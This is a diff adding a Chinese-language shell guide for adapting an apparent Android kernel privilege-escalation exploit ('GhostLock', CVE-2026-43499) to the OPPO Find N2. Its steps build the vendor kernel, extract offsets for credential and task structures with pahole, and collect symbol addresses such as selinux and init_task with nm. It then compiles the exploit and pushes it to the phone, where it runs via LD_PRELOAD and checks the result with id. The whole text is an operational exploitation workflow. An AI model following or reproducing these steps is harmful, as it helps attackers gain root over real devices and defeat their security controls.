@@ -1,0 +1,33 @@
+# OPPO Find N2 GhostLock (CVE-2026-43499) 适配指南
+# ================================================
+
+# 步骤1: 安装编译工具 (需要 sudo)
+sudo apt install -y gcc make flex bison libssl-dev bc libelf-dev dwarves
+
+# 步骤2: 编译内核获取 vmlinux
+cd /home/xiuxiu391/桌面/oppo/kernel_src/android_kernel_oppo_sm8475-oppo-sm8475_b_16.0.0_find_n2
+export ARCH=arm64
+export SUBARCH=arm64
+export CROSS_COMPILE=aarch64-linux-gnu-
+make gki_defconfig
+make vmlinux -j$(nproc)
+
+# 步骤3: 用 pahole 提取精确偏移
+pahole -s task_struct vmlinux > /home/xiuxiu391/桌面/oppo/task_offsets.txt
+pahole -s cred vmlinux > /home/xiuxiu391/桌面/oppo/cred_offsets.txt
+pahole -s rt_mutex_waiter vmlinux > /home/xiuxiu391/桌面/oppo/waiter_offsets.txt
+pahole -s file_operations vmlinux > /home/xiuxiu391/桌面/oppo/fops_offsets.txt
+pahole -s pipe_buf_operations vmlinux > /home/xiuxiu391/桌面/oppo/pipe_ops_offsets.txt
+
+# 步骤4: 用 nm 提取符号地址
+aarch64-linux-gnu-nm vmlinux | grep -E "init_task|root_task_group|ashmem|configfs|nf_log|boot_id|selinux|security_hook|kmalloc_caches|anon_pipe_buf|noop_llseek|copy_splice|nfulnl_logger" > /home/xiuxiu391/桌面/oppo/symbols.txt
+
+# 步骤5: 编译 exploit
+cd /home/xiuxiu391/桌面/oppo/CyberMeowfia-main/IonStack/CVE-2026-43499/exploit
+# 先用 pahole 和 nm 的结果更新 target.h 中的偏移
+# 然后编译
+make PROJECT=oppo-find_n2
+
+# 步骤6: 推送到手机并测试
+adb push build/oppo-find_n2/bin/preload.so /data/local/tmp/preload.so
+adb shell "LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id"
